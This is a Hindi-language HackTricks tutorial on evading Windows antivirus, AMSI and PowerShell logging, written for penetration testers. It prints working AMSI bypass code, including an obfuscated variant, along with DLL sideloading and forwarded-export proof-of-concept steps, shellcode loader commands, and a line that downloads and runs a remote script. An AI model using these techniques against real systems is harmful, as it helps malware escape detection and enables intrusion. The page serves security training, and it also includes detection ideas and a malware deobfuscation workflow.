# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**यह पृष्ठ लिखा गया है** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Defender को रोकें

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender को काम करना बंद करने के लिए एक टूल।
- [no-defender](https://github.com/es3n1n/no-defender): किसी अन्य AV का नक़ल करके Windows Defender को काम करना बंद करने वाला टूल।
- [यदि आप admin हैं तो Defender अक्षम करें](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

वर्तमान में, AVs फ़ाइल को malicious या नहीं चिह्नित करने के लिए अलग-अलग तरीके इस्तेमाल करते हैं: static detection, dynamic analysis, और अधिक उन्नत EDRs के लिए behavioural analysis।

### **Static detection**

Static detection उस स्थिति को कहते हैं जहाँ बाइनरी या स्क्रिप्ट में ज्ञात malicious strings या byte arrays को flag किया जाता है, और साथ ही फ़ाइल से स्वयं जानकारी निकालकर देखा जाता है (जैसे file description, company name, digital signatures, icon, checksum, आदि)। इसका मतलब यह है कि public tools का उपयोग करना आपको आसानी से पकड़ा सकता है, क्योंकि उन्हें शायद पहले ही analyze करके malicious के रूप में चिह्नित किया जा चुका होता है। इस तरह की detection से बचने के कुछ तरीके हैं:

- **Encryption**

यदि आप बाइनरी को encrypt कर देते हैं, तो AV के लिए आपके प्रोग्राम का पता लगाना असंभव हो जाएगा, लेकिन फिर आपको प्रोग्राम को memory में decrypt और run करने के लिए किसी loader की आवश्यकता होगी।

- **Obfuscation**

कभी-कभी बस अपनी बाइनरी या स्क्रिप्ट में कुछ strings बदल देना ही AV को छलने के लिए काफी होता है, लेकिन यह उस पर निर्भर करता है कि आप क्या obfuscate कर रहे हैं — कभी-कभी यह समय-साध्य काम हो सकता है।

- **Custom tooling**

यदि आप अपने खुद के tools विकसित करते हैं, तो कोई ज्ञात bad signature नहीं होगा, पर यह बहुत समय और मेहनत लेता है।

> [!TIP]
> Windows Defender की static detection के खिलाफ जांच करने का एक अच्छा तरीका [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) है। यह मूलतः फ़ाइल को कई segments में बाँटता है और फिर Defender को प्रत्येक segment अलग-अलग scan करने के लिए देता है; इस तरह यह आपको ठीक बताता है कि आपकी बाइनरी में कौन सी strings या bytes flagged हो रही हैं।

मैं आपको इस practical AV Evasion के बारे में इस [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) को देखने की सलाह देता हूँ।

### **Dynamic analysis**

Dynamic analysis वह प्रक्रिया है जब AV आपकी बाइनरी को एक sandbox में चलाकर malicious activity (उदा. ब्राउज़र के पासवर्ड decrypt करके पढ़ना, LSASS पर minidump करना, आदि) की निगरानी करता है। इस हिस्से के साथ काम करना थोड़ा चुनौतीपूर्ण हो सकता है, पर sandbox से बचने के लिए आप कुछ चीजें कर सकते हैं:

- **Sleep before execution** लागू करने के तरीके पर निर्भर करते हुए यह AV के dynamic analysis को bypass करने का अच्छा तरीका हो सकता है। AVs के पास फ़ाइलों को scan करने के लिए बहुत कम समय होता है ताकि यूजर के workflow में बाधा न आए, इसलिए लंबे sleeps से binaries के analysis को बाधित किया जा सकता है। समस्या यह है कि कई AVs की sandboxes sleep को skip कर सकती हैं, यह implementation पर निर्भर करता है।
- **Checking machine's resources** आम तौर पर Sandboxes के पास काम करने के लिए बहुत कम resources होते हैं (उदा. < 2GB RAM), वरना वे यूज़र की मशीन को धीमा कर देंगे। आप यहाँ काफी creative भी हो सकते हैं, उदाहरण के लिए CPU का तापमान या fan speeds चेक करके — इतना कुछ sandbox में implement नहीं होगा।
- **Machine-specific checks** यदि आप किसी user को target करना चाहते हैं जिसकी workstation "contoso.local" domain में joined है, तो आप कंप्यूटर के domain की जाँच कर सकते हैं कि क्या वो आपके specified domain से मेल खाता है; अगर नहीं, तो आप अपना प्रोग्राम exit करवा सकते हैं।

पता चला कि Microsoft Defender के Sandbox का computername HAL9TH है, तो आप अपने malware में detonation से पहले computer name की जाँच कर सकते हैं; अगर नाम HAL9TH से मेल खाता है, तो आप समझ सकते हैं कि आप defender के sandbox के अंदर हैं और अपना प्रोग्राम exit करवा सकते हैं।

<figure><img src="../images/image (209).png" alt=""><figcaption><p>स्रोत: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandboxes के खिलाफ जाने के लिए [@mgeeky](https://twitter.com/mariuszbit) से कुछ और बहुत अच्छे सुझाव

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

जैसा कि हमने पहले कहा है, **public tools** अंततः **detected** हो ही जाएँगे, इसलिए आपको खुद से यह प्रश्न पूछना चाहिए:

उदाहरण के लिए, यदि आप LSASS dump करना चाहते हैं, **क्या आपको वास्तव में mimikatz का उपयोग करना जरूरी है**? या क्या आप कोई ऐसा project इस्तेमाल कर सकते हैं जो कम जाना-पहचाना हो और जो भी LSASS dump करता हो।

सही जवाब शायद बाद वाला है। mimikatz को लें तो यह शायद AVs और EDRs द्वारा सबसे अधिक flagged टूल्स में से एक है; जबकि प्रोजेक्ट स्वयं बढ़िया है, AVs से बचने के लिए इससे काम करना काफी कठिन है, तो जो हासिल करना है उसके लिए alternatives ढूंढें।

> [!TIP]
> जब आप अपने payloads को evasion के लिए modify कर रहे हों, तो सुनिश्चित करें कि आप Defender में automatic sample submission को बंद कर दें, और कृपया, गंभीरता से, यदि आपकी लंबी अवधि की उद्देश्य evasion है तो **VIRUSTOTAL पर UPLOAD न करें**। यदि आप देखना चाहते हैं कि आपका payload किसी विशेष AV द्वारा detect होता है या नहीं, तो किसी VM पर AV install कर के automatic sample submission बंद करने की कोशिश करें, और वहीं तब तक टेस्ट करें जब तक आप परिणाम से संतुष्ट न हों।

## EXEs vs DLLs

जब भी संभव हो, हमेशा evasion के लिए **DLLs का उपयोग प्राथमिकता दें**; मेरे अनुभव में, DLL फ़ाइलें आम तौर पर **काफी कम detected** और analyze की जाती हैं, इसलिए यह कुछ मामलों में detection से बचने के लिए एक बहुत ही सरल ट्रिक है (बशर्ते आपका payload किसी तरह से DLL के रूप में चल सके)।

जैसा कि इस इमेज में देखा जा सकता है, Havoc का एक DLL Payload antiscan.me में 4/26 detection rate दिखाता है, जबकि EXE payload का detection rate 7/26 है।

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me में सामान्य Havoc EXE payload बनाम सामान्य Havoc DLL की तुलना</p></figcaption></figure>

अब हम कुछ tricks दिखाएंगे जो आप DLL फ़ाइलों के साथ उपयोग करके बहुत अधिक stealthy बन सकते हैं।

## DLL Sideloading & Proxying

**DLL Sideloading** loader द्वारा इस्तेमाल किए जाने वाले DLL search order का फायदा उठाता है, जिसमें victim application और malicious payload(s) को एक साथ रखा जाता है।

आप DLL Sideloading के लिए susceptible प्रोग्राम्स की जाँच [Siofra](https://github.com/Cybereason/siofra) और निम्न powershell स्क्रिप्ट से कर सकते हैं:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
यह कमांड "C:\Program Files\\" के अंदर DLL hijacking के प्रति संवेदनशील प्रोग्रामों और उन प्रोग्रामों द्वारा लोड किए जाने वाले DLL फाइलों की सूची आउटपुट करेगा।

मैं दृढ़ता से सलाह देता/देती हूँ कि आप स्वयं **DLL Hijackable/Sideloadable programs** का अन्वेषण करें; यदि यह तकनीक सही तरीके से की जाए तो यह काफी stealthy होती है, लेकिन यदि आप सार्वजनिक रूप से जाने-माने DLL Sideloadable programs का उपयोग करते हैं तो आपको आसानी से पकड़ा जा सकता है।

केवल किसी प्रोग्राम के द्वारा अपेक्षित नाम के साथ एक दुर्भावनापूर्ण DLL रख देने भर से आपका payload नहीं चलेगा, क्योंकि प्रोग्राम उस DLL के अंदर कुछ विशिष्ट फ़ंक्शन की उम्मीद करता है। इस समस्या को हल करने के लिए, हम एक और तकनीक का उपयोग करेंगे जिसे **DLL Proxying/Forwarding** कहते हैं।

**DLL Proxying** proxy (and malicious) DLL से प्रोग्राम द्वारा किए गए कॉल्स को मूल DLL तक अग्रेषित करता है, इस प्रकार प्रोग्राम की कार्यक्षमता बनी रहती है और आप अपने payload के निष्पादन को संभाल सकते हैं।

मैं [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) प्रोजेक्ट का उपयोग करूँगा जो [@flangvik](https://twitter.com/Flangvik/) से है।

ये वे कदम हैं जो मैंने अपनाए:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
अंतिम कमांड हमें 2 फ़ाइलें देगा: एक DLL source code template, और मूल रूप से नाम बदला हुआ DLL।

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
ये परिणाम हैं:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

हमारे दोनों shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) और proxy DLL का [antiscan.me](https://antiscan.me) पर Detection rate 0/26 है! मैं इसे एक सफलता मानूँगा।

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> मैं **ज़ोर देकर सलाह देता हूँ** कि आप [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) जो DLL Sideloading के बारे में है देखें और साथ ही [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) भी देखें ताकि आप हमने जो बात की है उसे अधिक गहराई से समझ सकें।

### Forwarded Exports (ForwardSideLoading) का दुरुपयोग

Windows PE modules ऐसे functions export कर सकते हैं जो वास्तव में "forwarders" होते हैं: कोड की ओर संकेत करने के बजाय, export entry में एक ASCII string रहती है जिसका स्वरूप `TargetDll.TargetFunc` होता है। जब कोई caller उस export को resolve करता है, तो Windows loader निम्न करेगा:

- Load `TargetDll` if not already loaded
- Resolve `TargetFunc` from it

समझने के लिए मुख्य बातें:
- यदि `TargetDll` एक KnownDLL है, तो यह protected KnownDLLs namespace से प्रदान किया जाता है (e.g., ntdll, kernelbase, ole32)।
- यदि `TargetDll` एक KnownDLL नहीं है, तो normal DLL search order इस्तेमाल किया जाता है, जिसमें उस module की directory शामिल है जो forward resolution कर रहा है।

यह एक indirect sideloading primitive को सक्षम बनाता है: एक signed DLL ढूँढें जो किसी non-KnownDLL module नाम की ओर forwarded किसी function को export करता हो, फिर उस signed DLL को उसी directory में रखें जहाँ एक attacker-controlled DLL को forwarded target module के बिल्कुल उसी नाम से रखा गया हो। जब forwarded export invoke होता है, loader forward को resolve करता है और आपकी DLL को उसी directory से load करता है, और आपका DllMain execute होता है।

Windows 11 पर देखा गया उदाहरण:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` KnownDLL नहीं है, इसलिए इसे सामान्य खोज क्रम के अनुसार रिज़ॉल्व किया जाता है।

PoC (copy-paste):
1) साइन किए गए सिस्टम DLL को एक लेखनीय फ़ोल्डर में कॉपी करें
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) उसी फ़ोल्डर में एक हानिकारक `NCRYPTPROV.dll` रखें। एक न्यूनतम `DllMain` कोड निष्पादन के लिए पर्याप्त है; `DllMain` को ट्रिगर करने के लिए forwarded function को लागू करने की आवश्यकता नहीं है।
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) साइन किए गए LOLBin के साथ forward को ट्रिगर करें:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
प्रेक्षित व्यवहार:
- rundll32 (signed) साइड-बाय-साइड `keyiso.dll` (signed) को लोड करता है
- जब `KeyIsoSetAuditingInterface` को रेज़ॉल्व किया जा रहा होता है, तो लोडर फॉरवर्ड का पालन करके `NCRYPTPROV.SetAuditingInterface` पर जाता है
- इसके बाद लोडर `NCRYPTPROV.dll` को `C:\test` से लोड करता है और इसका `DllMain` निष्पादित करता है
- यदि `SetAuditingInterface` लागू नहीं है, तो आपको "missing API" त्रुटि केवल तब मिलेगी जब `DllMain` पहले ही चल चुका होगा

हंटिंग टिप्स:
- उन forwarded exports पर ध्यान दें जहाँ लक्ष्य मॉड्यूल KnownDLL नहीं है। KnownDLLs सूचीबद्ध हैं `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- आप forwarded exports को निम्न tooling से enumerate कर सकते हैं:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Windows 11 forwarder इन्वेंटरी देखें ताकि उम्मीदवारों की खोज कर सकें: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- Monitor LOLBins (e.g., rundll32.exe) द्वारा non-system paths से signed DLLs लोड करने और फिर उसी डायरेक्टरी से उसी base name वाले non-KnownDLLs लोड करने पर निगरानी रखें
- ऐसी process/module चेन पर अलर्ट करें: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` जो user-writable paths के तहत हों
- कोड इंटेग्रिटी नीतियाँ लागू करें (WDAC/AppLocker) और application directories में write+execute को नकार दें

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

आप Freeze का उपयोग अपने shellcode को एक छिपे हुए तरीके से लोड और निष्पादित करने के लिए कर सकते हैं।
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion बस एक बिल्ली और चूहे का खेल है; जो आज काम करता है वह कल डिटेक्ट हो सकता है, इसलिए कभी केवल एक ही टूल पर निर्भर न रहें — जहाँ संभव हो कई evasion techniques को chain करने की कोशिश करें।

## AMSI (Anti-Malware Scan Interface)

AMSI को "fileless malware" को रोकने के लिए बनाया गया था। शुरुआत में, AVs केवल **files on disk** को स्कैन करने में सक्षम थे, इसलिए यदि आप किसी तरह payloads को **directly in-memory** execute कर पाते थे, तो AV कुछ नहीं कर पाता था क्योंकि उसे पर्याप्त visibility नहीं मिलती थी।

The AMSI feature is integrated into these components of Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

यह antivirus solutions को script के व्यवहार को inspect करने की अनुमति देता है क्योंकि यह script के contents को एक ऐसी form में expose करता है जो कि unencrypted और unobfuscated दोनों ही होता है।

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

ध्यान दें कि यह `amsi:` को prepend करता है और फिर उस executable का path दिखाता है जिससे script रन हुआ, इस मामले में powershell.exe

हमने disk पर कोई file नहीं छोड़ी थी, फिर भी AMSI की वजह से in-memory में पकड़े गए।

Moreover, starting with **.NET 4.8**, C# code is run through AMSI as well. This even affects `Assembly.Load(byte[])` to load in-memory execution. Thats why using lower versions of .NET (like 4.7.2 or below) is recommended for in-memory execution if you want to evade AMSI.

AMSI को बायपास करने के कुछ तरीके हैं:

- **Obfuscation**

चूँकि AMSI मुख्यतः static detections के साथ काम करता है, इसलिए जिन scripts को आप load करने की कोशिश करते हैं उन्हें modify करना detection से बचने का एक अच्छा तरीका हो सकता है।

हालाँकि, AMSI में scripts को unobfuscate करने की क्षमता होती है भले ही उनमें कई layers हों, इसलिए obfuscation एक खराब विकल्प हो सकता है — यह इस बात पर निर्भर करता है कि इसे कैसे किया गया है। इसलिए इसे evade करना इतना straightforward नहीं है। हालाँकि कभी-कभी केवल कुछ variable नाम बदलने भर से काम चल जाता है, तो यह उस पर निर्भर करता है कि किसी चीज़ को कितना flag किया गया है।

- **AMSI Bypass**

AMSI को powershell (साथ ही cscript.exe, wscript.exe, आदि) process में DLL लोड करके implement किया जाता है, इसलिए इसे आसानी से tamper किया जा सकता है यहाँ तक कि unprivileged user के रूप में भी। AMSI के implementation में इस flaw की वजह से researchers ने AMSI scanning को evade करने के कई तरीके खोजे हैं।

**Forcing an Error**

Forcing the AMSI initialization to fail (amsiInitFailed) will result that no scan will be initiated for the current process. Originally this was disclosed by [Matt Graeber](https://twitter.com/mattifestation) and Microsoft has developed a signature to prevent wider usage.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
AMSI को वर्तमान powershell प्रक्रिया के लिए अनुपयोगी करने के लिए सिर्फ एक लाइन powershell कोड काफी था। यह लाइन स्वाभाविक रूप से AMSI द्वारा फ्लैग कर दी गई है, इसलिए इस तकनीक का इस्तेमाल करने के लिए कुछ संशोधन आवश्यक हैं।

यहाँ एक संशोधित AMSI bypass है जिसे मैंने इस [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) से लिया है।
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
ध्यान में रखें, कि यह पोस्ट प्रकाशित होते ही संभवतः फ़्लैग हो जाएगा, इसलिए यदि आपका लक्ष्य अनदेखा रहना है तो कोई भी code प्रकाशित न करें।

**Memory Patching**

यह तकनीक मूल रूप से [@RastaMouse](https://twitter.com/_RastaMouse/) द्वारा खोजी गई थी और इसमें amsi.dll में "AmsiScanBuffer" फंक्शन के लिए address ढूँढना और उसे इस तरह overwrite करना शामिल है कि वह E_INVALIDARG के return code को लौटाने के निर्देश दे — इस तरह असली scan का परिणाम 0 लौटेगा, जिसे clean परिणाम माना जाता है।

> [!TIP]
> अधिक विस्तृत व्याख्या के लिए कृपया [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) पढ़ें।

इनके अलावा AMSI को powershell के साथ बायपास करने के कई अन्य तरीके भी हैं, अधिक जानने के लिए [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) और [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) देखें।

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI केवल तब इनिशियलाइज़ होता है जब `amsi.dll` वर्तमान process में लोड हो। एक robust, language‑agnostic bypass यह है कि `ntdll!LdrLoadDll` पर user‑mode hook लगाया जाए जो जब अनुरोधित मॉड्यूल `amsi.dll` हो तो एक error लौटाए। नतीजतन, AMSI कभी लोड नहीं होगा और उस process के लिए कोई scan नहीं होगा।

इम्प्लीमेंटेशन रूपरेखा (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
नोट्स
- PowerShell, WScript/CScript और custom loaders दोनों पर काम करता है (जो भी अन्यथा AMSI लोड करते)।
- stdin के माध्यम से स्क्रिप्ट फीड करने के साथ जोड़ें (`PowerShell.exe -NoProfile -NonInteractive -Command -`) ताकि लंबे command‑line अवशेषों से बचा जा सके।
- loaders जो LOLBins के जरिए execute होते हैं, उनमें उपयोग होते देखा गया है (उदा., `regsvr32` द्वारा `DllRegisterServer` कॉल करना)।

This tools [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**पहचानी गई सिग्नेचर हटाएँ**

आप ऐसे टूल का उपयोग कर सकते हैं जैसे **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** और **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** ताकि वर्तमान प्रॉसेस की मेमोरी से पहचानी गई AMSI सिग्नेचर को हटाया जा सके। यह टूल वर्तमान प्रॉसेस की मेमोरी में AMSI सिग्नेचर को स्कैन करके उसे NOP निर्देशों से ओवरराइट कर देता है, प्रभावी रूप से इसे मेमोरी से हटा देता है।

**AMSI का उपयोग करने वाले AV/EDR प्रोडक्ट्स**

AMSI का उपयोग करने वाले AV/EDR प्रोडक्ट्स की सूची आप **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** में पा सकते हैं।

**PowerShell version 2 का उपयोग करें**
यदि आप PowerShell version 2 का उपयोग करते हैं, तो AMSI लोड नहीं होगा, इसलिए आप अपनी स्क्रिप्ट्स बिना AMSI द्वारा स्कैन किए चला सकते हैं। आप ऐसा कर सकते हैं:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging एक फीचर है जो किसी सिस्टम पर चलाए गए सभी PowerShell कमांड्स को लॉग करने देता है। यह auditing और troubleshooting के लिए उपयोगी हो सकता है, लेकिन attackers के लिए भी यह एक समस्या हो सकती है जो detection से बचना चाहते हैं।

To bypass PowerShell logging, आप निम्न तकनीकें उपयोग कर सकते हैं:

- **Disable PowerShell Transcription and Module Logging**: आप इस उद्देश्य के लिए ऐसा टूल इस्तेमाल कर सकते हैं, उदाहरण के लिए [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs)।
- **Use Powershell version 2**: अगर आप PowerShell version 2 यूज़ करते हैं तो AMSI लोड नहीं होगा, जिससे आप अपने स्क्रिप्ट बिना AMSI स्कैन के चला सकते हैं। इसे ऐसे चलाएं: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) का उपयोग करके एक defenses-से मुक्त powershell spawn करें (यही `powerpick` use होता है Cobal Strike में)।

## Obfuscation

> [!TIP]
> कई obfuscation techniques डेटा को encrypt करने पर निर्भर करती हैं, जिससे binary की entropy बढ़ जाती है और AVs और EDRs के लिए उसे detect करना आसान हो जाता है। इस पर सावधानी बरतें और संभव हो तो encryption केवल उन हिस्सों पर लागू करें जो sensitive हों या छिपाए जाने की ज़रूरत हो।

### Deobfuscating ConfuserEx-Protected .NET Binaries

जब आप ऐसे malware का विश्लेषण करते हैं जो ConfuserEx 2 (या commercial forks) का उपयोग करता है, तो आमतौर पर कई protective layers मिलेंगे जो decompilers और sandboxes को रोकते हैं। नीचे दिया workflow विश्वसनीय रूप से एक near–original IL को **restore** करता है जिसे बाद में dnSpy या ILSpy जैसे tools में C# में decompile किया जा सकता है।

1.  Anti-tampering removal – ConfuserEx हर *method body* को encrypt करता है और उसे *module* static constructor (`<Module>.cctor`) के अंदर decrypt करता है। यह PE checksum को भी patch करता है इसलिए कोई भी modification binary को crash कर सकती है। encrypted metadata tables को locate करने, XOR keys recover करने और एक clean assembly फिर से लिखने के लिए **AntiTamperKiller** का उपयोग करें:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output में 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`) होंगे जो अपने unpacker बनाते समय उपयोगी हो सकते हैं।

2.  Symbol / control-flow recovery – *clean* फ़ाइल को **de4dot-cex** (de4dot का ConfuserEx-aware fork) को feeding करें।
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – ConfuserEx 2 profile चुनना  
• de4dot control-flow flattening को undo करेगा, original namespaces, classes और variable names को restore करेगा और constant strings को decrypt करेगा।

3.  Proxy-call stripping – ConfuserEx direct method calls को हल्के wrappers (a.k.a *proxy calls*) से बदल देता है ताकि decompilation और कठिन हो। इन्हें हटाने के लिए **ProxyCall-Remover** का उपयोग करें:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
इस कदम के बाद आप opaque wrapper functions (`Class8.smethod_10`, …) के बजाय normal .NET API जैसे `Convert.FromBase64String` या `AES.Create()` देख पाएंगे।

4.  Manual clean-up – resulting binary को dnSpy में चलाएँ, बड़े Base64 blobs या `RijndaelManaged`/`TripleDESCryptoServiceProvider` के उपयोग को खोजें ताकि *real* payload का पता चल सके। अक्सर malware इसे `<Module>.byte_0` के अंदर TLV-encoded byte array के रूप में store करता है।

ऊपर दिया गया chain execution flow को restore करता है **बिना** malicious sample को चलाए — यह offline workstation पर काम करते समय उपयोगी है।

> 🛈  ConfuserEx एक custom attribute `ConfusedByAttribute` बनाता है जिसे IOC के रूप में samples को automatically triage करने के लिए उपयोग किया जा सकता है।

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): इस प्रोजेक्ट का उद्देश्य [LLVM](http://www.llvm.org/) compilation suite का एक open-source fork प्रदान करना है जो [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) और tamper-proofing के माध्यम से सॉफ़्टवेयर सुरक्षा बढ़ा सके।
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator यह दर्शाता है कि `C++11/14` भाषा का उपयोग करके compile time पर obfuscated code कैसे generate किया जा सकता है, बिना किसी external tool का उपयोग किए और बिना compiler को modify किए।
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming framework द्वारा generate की गई obfuscated operations की एक परत जोड़ता है, जिससे application को crack करने वाले व्यक्ति के लिए काम थोड़ा कठिन हो जाएगा।
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz एक x64 binary obfuscator है जो विभिन्न PE फाइलों को obfuscate कर सकता है, जैसे: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame arbitrary executables के लिए एक simple metamorphic code engine है।
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator एक fine-grained code obfuscation framework है जो LLVM-supported languages में ROP (return-oriented programming) का उपयोग करता है। ROPfuscator assembly code स्तर पर प्रोग्राम को obfuscate करता है, सामान्य instructions को ROP chains में बदलकर सामान्य control flow की प्राकृतिक धारणा को बाधित करता है।
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt Nim में लिखा गया एक .NET PE Crypter है
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor मौजूदा EXE/DLL को shellcode में convert कर सकता है और फिर उन्हें load कर सकता है

## SmartScreen & MoTW

जब आप इंटरनेट से कुछ executables डाउनलोड करके उन्हें execute करते हैं तो आपने यह स्क्रीन देखी होगी।

Microsoft Defender SmartScreen एक security mechanism है जो end user को संभावित malicious applications चलाने से बचाने के लिए डिजाइन किया गया है।

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

